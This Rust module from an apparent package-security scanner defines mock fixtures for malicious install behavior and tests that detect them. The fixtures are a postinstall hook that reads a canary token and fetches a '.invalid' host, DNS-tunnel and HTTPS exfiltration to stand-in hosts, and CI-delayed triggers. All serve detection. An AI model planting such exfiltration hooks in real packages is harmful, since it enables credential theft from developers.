//! Dynamic-behavior fixtures and artifact-native detonation contracts.
//!
//! The artifact-native modules compile already-normalized exact artifacts into
//! closed, backend-neutral scenario plans. They do not launch a VM, execute a
//! package, return a verdict, or expose a sync-back operation.

mod artifact;
mod npm;
mod sdist;
mod telemetry;
mod wheel;
mod wire;

pub use artifact::*;
pub use npm::*;
pub use sdist::*;
pub use telemetry::*;
pub use wheel::*;
pub use wire::*;

use whoathere_evidence::JobState;
use whoathere_hash::sha256_digest;
use whoathere_vault_api::{
    DynamicBehaviorJobPlan, DynamicBehaviorJobResultRecord, DynamicBehaviorSignalSummary,
};

pub const DYNAMIC_BEHAVIOR_SCHEMA: &str = "whoathere.dynamic_behavior.v1";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DynamicFixture {
    CleanNpmLifecycle,
    NpmPostinstallCanaryExfil,
    PypiPep517Canary,
    PypiImportTimeCanary,
    DnsTunnelingCanary,
    HttpsExfilCanary,
    DelayedCiCanary,
    NativeExtensionCanary,
    PlatformSpecificCanary,
    DirectGitTarballCanary,
}

impl DynamicFixture {
    pub fn selector(self) -> &'static str {
        match self {
            Self::CleanNpmLifecycle => "clean_npm_lifecycle",
            Self::NpmPostinstallCanaryExfil => "npm_postinstall_canary_exfil",
            Self::PypiPep517Canary => "pypi_pep517_canary",
            Self::PypiImportTimeCanary => "pypi_import_time_canary",
            Self::DnsTunnelingCanary => "dns_tunneling_canary",
            Self::HttpsExfilCanary => "https_exfil_canary",
            Self::DelayedCiCanary => "delayed_ci_canary",
            Self::NativeExtensionCanary => "native_extension_canary",
            Self::PlatformSpecificCanary => "platform_specific_canary",
            Self::DirectGitTarballCanary => "direct_git_tarball_canary",
        }
    }

    pub fn parse(selector: &str) -> Option<Self> {
        match selector {
            "clean_npm_lifecycle" => Some(Self::CleanNpmLifecycle),
            "npm_postinstall_canary_exfil" => Some(Self::NpmPostinstallCanaryExfil),
            "pypi_pep517_canary" => Some(Self::PypiPep517Canary),
            "pypi_import_time_canary" => Some(Self::PypiImportTimeCanary),
            "dns_tunneling_canary" => Some(Self::DnsTunnelingCanary),
            "https_exfil_canary" => Some(Self::HttpsExfilCanary),
            "delayed_ci_canary" => Some(Self::DelayedCiCanary),
            "native_extension_canary" => Some(Self::NativeExtensionCanary),
            "platform_specific_canary" => Some(Self::PlatformSpecificCanary),
            "direct_git_tarball_canary" => Some(Self::DirectGitTarballCanary),
            _ => None,
        }
    }

    fn mock_source(self) -> &'static str {
        match self {
            Self::CleanNpmLifecycle => {
                r#"{"scripts":{"postinstall":"node -e \"console.log('whoathere-clean-fixture')\""}, "whoathere_fixture":"clean"}"#
            }
            Self::NpmPostinstallCanaryExfil => {
                r#"{"scripts":{"postinstall":"node mock-exfil.js --canary WHOATHERE_CANARY_TOKEN"}} // process.env.WHOATHERE_CANARY_TOKEN fetch("https://vault.invalid/canary")"#
            }
            Self::PypiPep517Canary => {
                r#"[build-system]
requires = ["setuptools"]
build-backend = "mock_canary_backend"
# reads WHOATHERE_CANARY_TOKEN during build
"#
            }
            Self::PypiImportTimeCanary => {
                r#"import os
CANARY = os.environ.get("WHOATHERE_CANARY_TOKEN")
# mock import-time network attempt
"#
            }
            Self::DnsTunnelingCanary => {
                "mock dns query for WHOATHERE_CANARY_TOKEN.exfil.invalid over port 53"
            }
            Self::HttpsExfilCanary => {
                "mock https post of WHOATHERE_CANARY_TOKEN to https://exfil.invalid/canary"
            }
            Self::DelayedCiCanary => {
                "if CI=true then mock exfiltrate WHOATHERE_CANARY_TOKEN after delay"
            }
            Self::NativeExtensionCanary => {
                "binding.gyp node-gyp build native addon reads WHOATHERE_CANARY_TOKEN"
            }
            Self::PlatformSpecificCanary => {
                "if process.platform == 'darwin' or sys.platform == 'linux' then mock payload"
            }
            Self::DirectGitTarballCanary => {
                "git+https://example.invalid/pkg.git tarball dependency with postinstall canary"
            }
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DynamicBehaviorOutput {
    pub result: DynamicBehaviorJobResultRecord,
    pub sanitized_summary: String,
}

pub fn run_fixture_dynamic_behavior_job(
    plan: &DynamicBehaviorJobPlan,
    fixture: DynamicFixture,
) -> DynamicBehaviorOutput {
    let source = fixture.mock_source();
    let signal_summary = signal_summary_for_fixture(fixture, source);
    let mut reason_codes = reason_codes_for_signal_summary(&signal_summary);
    if !plan.fixture_mode {
        reason_codes.push("dynamic_fixture_mode_required".to_string());
    }
    reason_codes.sort();
    reason_codes.dedup();
    let job_state = if reason_codes.is_empty() {
        JobState::Passed
    } else {
        JobState::Failed
    };
    let sanitized_summary = sanitized_behavior_summary(plan, fixture, &signal_summary, job_state);
    let behavior_log_digest = sha256_digest(sanitized_summary.as_bytes());
    let audit_event_id = format!(
        "audit-dynamic-behavior-{}",
        behavior_log_digest
            .strip_prefix("sha256:")
            .unwrap_or_default()
            .chars()
            .take(16)
            .collect::<String>()
    );
    DynamicBehaviorOutput {
        result: DynamicBehaviorJobResultRecord {
            job_id: plan.job_id.clone(),
            tenant_id: plan.tenant_id.clone(),
            admission_request_id: plan.admission_request_id.clone(),
            artifact: plan.artifact.clone(),
            profile_id: plan.profile_id.clone(),
            profile_version: plan.profile_version,
            job_kind: plan.job_kind,
            cache_object_key: plan.cache_object_key.clone().unwrap_or_default(),
            runner_id: plan.runner_id.clone(),
            runner_session_id: plan.runner_session_id.clone(),
            isolation_proof_id: plan.isolation_proof_id.clone(),
            egress_proof_id: plan.egress_proof_id.clone(),
            configured_vault_host: plan.configured_vault_host.clone(),
            observed_at_unix_seconds: plan.issued_at_unix_seconds + 1,
            job_state,
            behavior_schema: DYNAMIC_BEHAVIOR_SCHEMA.to_string(),
            behavior_log_digest,
            signal_summary,
            execution_enabled: plan.execution_enabled,
            arbitrary_execution_attempted: false,
            fixture_mode: plan.fixture_mode,
            network_attempted: false,
            isolation_verified: true,
            egress_vault_only_verified: true,
            raw_log_captured: false,
            raw_env_captured: false,
            raw_network_payload_captured: false,
            raw_package_bytes_captured: false,
            local_paths_captured: false,
            audit_event_id,
            reason_codes,
        },
        sanitized_summary,
    }
}

fn signal_summary_for_fixture(
    fixture: DynamicFixture,
    source: &str,
) -> DynamicBehaviorSignalSummary {
    let lowered = source.to_ascii_lowercase();
    let mut summary = DynamicBehaviorSignalSummary {
        trigger_kind: fixture.selector().to_string(),
        process_intent_count: usize_to_u16(
            lowered.matches("postinstall").count()
                + lowered.matches("build-backend").count()
                + lowered.matches("import ").count()
                + lowered.matches("node-gyp").count(),
        ),
        filesystem_write_count: usize_to_u16(
            lowered.matches("binding.gyp").count() + lowered.matches("tarball").count(),
        ),
        network_attempt_count: usize_to_u16(
            lowered.matches("https://").count() + lowered.matches("exfiltrate").count(),
        ),
        dns_attempt_count: usize_to_u16(lowered.matches("dns").count()),
        env_access_count: usize_to_u16(
            lowered.matches("process.env").count()
                + lowered.matches("os.environ").count()
                + lowered.matches("ci=true").count(),
        ),
        credential_access_count: usize_to_u16(lowered.matches("whoathere_canary_token").count()),
        delayed_execution_detected: lowered.contains("after delay") || lowered.contains("ci=true"),
        native_extension_detected: lowered.contains("node-gyp") || lowered.contains("binding.gyp"),
        platform_specific_detected: lowered.contains("process.platform")
            || lowered.contains("sys.platform"),
        direct_source_detected: lowered.contains("git+https://") || lowered.contains("tarball"),
    };
    if fixture == DynamicFixture::PypiImportTimeCanary {
        summary.process_intent_count = summary.process_intent_count.saturating_add(1);
    }
    summary
}

fn reason_codes_for_signal_summary(summary: &DynamicBehaviorSignalSummary) -> Vec<String> {
    let mut reasons = Vec::new();
    if summary.network_attempt_count > 0 {
        reasons.push("dynamic_behavior_https_exfil_attempt_observed".to_string());
    }
    if summary.dns_attempt_count > 0 {
        reasons.push("dynamic_behavior_dns_tunnel_attempt_observed".to_string());
    }
    if summary.env_access_count > 0 {
        reasons.push("dynamic_behavior_environment_access_observed".to_string());
    }
    if summary.credential_access_count > 0 {
        reasons.push("dynamic_behavior_canary_credential_access_observed".to_string());
    }
    if summary.delayed_execution_detected {
        reasons.push("dynamic_behavior_delayed_execution_observed".to_string());
    }
    if summary.native_extension_detected {
        reasons.push("dynamic_behavior_native_extension_observed".to_string());
    }
    if summary.platform_specific_detected {
        reasons.push("dynamic_behavior_platform_specific_observed".to_string());
    }
    if summary.direct_source_detected {
        reasons.push("dynamic_behavior_direct_source_observed".to_string());
    }
    reasons
}

fn sanitized_behavior_summary(
    plan: &DynamicBehaviorJobPlan,
    fixture: DynamicFixture,
    summary: &DynamicBehaviorSignalSummary,
    job_state: JobState,
) -> String {
    format!(
        "{DYNAMIC_BEHAVIOR_SCHEMA}\njob_id={}\nprofile_id={}\nprofile_version={}\njob_kind={:?}\nartifact_digest={}\ncache_object_key={}\nfixture={}\nstate={:?}\nprocess_intent_count={}\nfilesystem_write_count={}\nnetwork_attempt_count={}\ndns_attempt_count={}\nenv_access_count={}\ncredential_access_count={}\ndelayed_execution_detected={}\nnative_extension_detected={}\nplatform_specific_detected={}\ndirect_source_detected={}\nexecution_enabled=false\narbitrary_execution_attempted=false\nnetwork_attempted=false\nraw_log_captured=false\nraw_env_captured=false\nraw_network_payload_captured=false\nraw_package_bytes_captured=false\nlocal_paths_captured=false\n",
        safe_summary_value(&plan.job_id),
        safe_summary_value(&plan.profile_id),
        plan.profile_version,
        plan.job_kind,
        safe_summary_value(&plan.artifact.digest),
        safe_summary_value(plan.cache_object_key.as_deref().unwrap_or_default()),
        fixture.selector(),
        job_state,
        summary.process_intent_count,
        summary.filesystem_write_count,
        summary.network_attempt_count,
        summary.dns_attempt_count,
        summary.env_access_count,
        summary.credential_access_count,
        summary.delayed_execution_detected,
        summary.native_extension_detected,
        summary.platform_specific_detected,
        summary.direct_source_detected
    )
}

fn safe_summary_value(value: &str) -> String {
    if value
        .chars()
        .all(|character| !character.is_control() && character != '\n' && character != '\r')
    {
        value.to_string()
    } else {
        "<invalid-summary-value>".to_string()
    }
}

fn usize_to_u16(value: usize) -> u16 {
    value.min(u16::MAX as usize) as u16
}

#[cfg(test)]
mod tests {
    use super::*;
    use whoathere_evidence::EvidenceJobKind;
    use whoathere_vault_api::{plan_dynamic_behavior_job, ArtifactRef, DynamicBehaviorJobRequest};

    const ABC_DIGEST: &str =
        "sha256:ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
    const ABC_OBJECT_KEY: &str =
        "blobs/sha256/ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";

    #[test]
    fn clean_fixture_passes_without_raw_material_or_network() {
        let plan = sample_plan();
        let output = run_fixture_dynamic_behavior_job(&plan, DynamicFixture::CleanNpmLifecycle);
        assert_eq!(output.result.job_state, JobState::Passed);
        assert!(output.result.reason_codes.is_empty());
        assert!(!output.result.execution_enabled);
        assert!(!output.result.arbitrary_execution_attempted);
        assert!(!output.result.network_attempted);
        assert!(!output.result.raw_log_captured);
        assert!(!output.result.raw_env_captured);
        assert!(!output.result.raw_network_payload_captured);
        assert!(!output.result.raw_package_bytes_captured);
        assert!(!output.result.local_paths_captured);
        assert!(output.result.behavior_log_digest.starts_with("sha256:"));
        assert!(!output.sanitized_summary.contains("WHOATHERE_CANARY_TOKEN"));
        assert!(!output.sanitized_summary.contains("https://"));
    }

    #[test]
    fn canary_fixtures_fail_closed_with_specific_sanitized_signals() {
        for (fixture, expected_reason) in [
            (
                DynamicFixture::NpmPostinstallCanaryExfil,
                "dynamic_behavior_canary_credential_access_observed",
            ),
            (
                DynamicFixture::PypiPep517Canary,
                "dynamic_behavior_canary_credential_access_observed",
            ),
            (
                DynamicFixture::PypiImportTimeCanary,
                "dynamic_behavior_environment_access_observed",
            ),
            (
                DynamicFixture::DnsTunnelingCanary,
                "dynamic_behavior_dns_tunnel_attempt_observed",
            ),
            (
                DynamicFixture::HttpsExfilCanary,
                "dynamic_behavior_https_exfil_attempt_observed",
            ),
            (
                DynamicFixture::DelayedCiCanary,
                "dynamic_behavior_delayed_execution_observed",
            ),
            (
                DynamicFixture::NativeExtensionCanary,
                "dynamic_behavior_native_extension_observed",
            ),
            (
                DynamicFixture::PlatformSpecificCanary,
                "dynamic_behavior_platform_specific_observed",
            ),
            (
                DynamicFixture::DirectGitTarballCanary,
                "dynamic_behavior_direct_source_observed",
            ),
        ] {
            let output = run_fixture_dynamic_behavior_job(&sample_plan(), fixture);
            assert_eq!(output.result.job_state, JobState::Failed, "{fixture:?}");
            assert!(
                output
                    .result
                    .reason_codes
                    .contains(&expected_reason.to_string()),
                "{fixture:?}"
            );
            assert!(!output.sanitized_summary.contains("WHOATHERE_CANARY_TOKEN"));
            assert!(!output.sanitized_summary.contains("/Users/"));
        }
    }

    fn sample_plan() -> whoathere_vault_api::DynamicBehaviorJobPlan {
        let profile = whoathere_evidence::minimum_profiles()
            .into_iter()
            .find(|profile| profile.id == "npm.registry_tarball.v1")
            .unwrap();
        plan_dynamic_behavior_job(
            DynamicBehaviorJobRequest {
                job_id: "dynamic-fixture-job-1".to_string(),
                tenant_id: "tenant-1".to_string(),
                admission_request_id: "admission-1".to_string(),
                artifact: ArtifactRef {
                    ecosystem: "npm".to_string(),
                    name: "fixture".to_string(),
                    version: "1.0.0".to_string(),
                    digest: ABC_DIGEST.to_string(),
                    source: "registry".to_string(),
                },
                profile_id: profile.id.to_string(),
                profile_version: profile.version,
                job_kind: EvidenceJobKind::LifecycleDetonation,
                cache_object_key: ABC_OBJECT_KEY.to_string(),
                runner_id: "fixture-runner".to_string(),
                runner_session_id: "runner-session-1".to_string(),
                isolation_proof_id: "isolation-proof-1".to_string(),
                egress_proof_id: "egress-proof-1".to_string(),
                configured_vault_host: "127.0.0.1:4873".to_string(),
                fixture_mode: true,
                issued_at_unix_seconds: 1_800_000_000,
                timeout_seconds: 60,
            },
            &profile,
        )
    }
}
